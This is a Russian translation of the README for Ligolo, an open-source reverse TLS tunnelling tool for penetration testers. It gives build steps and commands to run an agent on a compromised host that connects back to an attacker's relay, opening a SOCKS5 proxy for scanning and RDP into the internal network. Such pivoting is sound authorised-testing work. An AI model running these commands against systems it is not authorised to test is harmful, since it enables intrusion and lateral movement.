# Ligolo : Простое обратное туннелирование для пентестеров, от пентестеров

[![forthebadge](https://forthebadge.com/images/badges/made-with-go.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/gluten-free.svg)](https://forthebadge.com)

![Ligolo](img/ligolo.png)

<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
## Содержание

- [Вступление](#introduction)
- [Пример использования](#use-case)
- [Быстрая демонстрация](#quick-demo)
- [Производительность](#performance)
- [Использование](#usage)
  - [Настройка / Компиляция](#setup--compiling)
  - [Как использовать?](#how-to-use)
  - [TL;DR](#tldr)
  - [Опции](#options)
- [Особенности](#features)
- [To Do](#to-do)
- [Лицензирование](#licensing)
- [Credits](#credits)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

## Вступление

**Ligolo** это * простой * и * легкий * инструмент для установления * SOCKS5 * или * TCP * туннелей из обратного соединения в полной безопасности (сертификат TLS с эллиптической кривой).
Это сопоставимо с * Meterpreter* с * Autoroute + Socks4a*, но более стабильно и быстрее.

## Пример использования

Вы скомпрометировали сервер Windows / Linux / Mac во время вашего внешнего аудита. Этот сервер расположен внутри локальной сети, и
вы хотите установить соединения с другими компьютерами в этой сети.

**Ligolo** может настроить туннель для доступа к ресурсам внутреннего сервера.

## Быстрая демонстрация

Ретрансляция RDP-соединения с использованием прокси-цепочек (WAN).

![RDP](img/rdesktop_example.gif)

## Производительность

Вот скриншот теста скорости между двумя хостами со скоростью 100 Мбит/с (ligolo / localrelay). Производительность может варьироваться в зависимости от конфигурации системы и сети.

![Проверка скорости](img/speedtest.png)

## Использование

### Настройка / Компиляция

Убедитесь, что * Go* установлен и работает.

1. Получите Ligolo и зависимости

```
cd `go env GOPATH`/src
git clone https://github.com/sysdream/ligolo
cd ligolo
make dep
```

2. Сгенерируйте самоподписанный TLS сертификат (будет помещен в *certs* папку)

```
make certs TLS_HOST=example.com
```

NOTE: Вы также можете использовать свои собственные сертификаты, используя `TLS_CERT` переменную окружения при вызове *build*. Пример: `make build-all TLS_CERT=certs/mycert.pem`.

3. Сборка

* 3.1. Для всех архитектур

```
make build-all
```

* 3.2. (или) Для текущей архитектуры

```
make build
```

### Как использовать?

*Ligolo* состоит из двух модулей:

- localrelay
- ligolo

*Localrelay* предназначен для запуска на сервере управления (сервере злоумышленника).

*Ligolo* это программа для запуска на целевом компьютере.

Для *localrelay*, вы можете оставить параметры по умолчанию. Он будет прослушивать каждый интерфейс на порту 5555 и ждать подключений от *ligolo* (`-relayserver` параметр).

For *ligolo*, you must specify the IP address of the relay server (or your attack server) using the `-relayserver ip:port` parameter.

Вы можете использовать `-h` для помощи.

Как только будет установлено соединение между *Ligolo* и *LocalRelay*, прокси-сервер *SOCKS5* будет поднят на TCP-порт `1080` на relay сервере (вы можете изменить TCP-адрес/порт, используя опцию *-localserver*).

После этого все, что вам нужно сделать, это использовать ваш любимый инструмент (например, Proxychains) и исследовать локальную сеть клиента.

### TL;DR

На вашем атакующем сервере.

```
./bin/localrelay_linux_amd64
```

На скомпроментированом хосте.

```
> ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555
```

Как только соединение установлено, установите следующие параметры в конфигурационном файле ProxyChains (на атакующем сервере):

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5     127.0.0.1 1080
```

Profit.

```
$ proxychains nmap -sT 10.0.0.0/24 -p 80 -Pn -A
$ proxychains rdesktop 10.0.0.123
```

### Опции

*Localrelay* опции:

```
Использование localrelay:
  -certfile string
    	Сертификат сервера TLS (по умолчанию "certs/server.crt")
  -keyfile string
    	Ключ сервера TLS (по умолчанию "certs/server.key")
  -localserver string
    	Адрес локального сервера (ваш параметр proxychains) (default "127.0.0.1:1080")
  -relayserver string
    	Адрес прослушивания сервера ретрансляции (обратный адрес для подключения) (default "0.0.0.0:5555")
```

*Ligolo* опции:

```
Использование ligolo:
  -autorestart
    	Попытка повторного подключения в случае ошибки
  -relayserver string
    	Сервер ретрансляции (обратный адрес для подключения) (default "127.0.0.1:5555")
  -skipverify
    	Пропустить проверку сертификата TLS
  -targetserver string
    	Целевой сервер (RDP-клиент, SSH-сервер и т.д.) - если не указано, Ligolo запускает прокси-сервер socks5.
```

## Особенности

- Туннель TLS 1.3 с поддержкой TLS
- Мультиплатформенность (Windows / Linux / Mac / ...)
- Мультиплексирование (1 TCP-соединение для всех потоков)
- Прокси-сервер SOCKS5 или простая ретрансляция

## To Do

- Улучшенная обработка тайм-аута
- Поддержка SOCKS5 UDP
- Implement mTLS

## Лицензирование

GNU General Public License v3.0 (See LICENSING).

## Credits

* Nicolas Chatelain <n.chatelain -at- sysdream.com>

[![Sysdream](img/logo_sysdream.png)](https://sysdream.com)
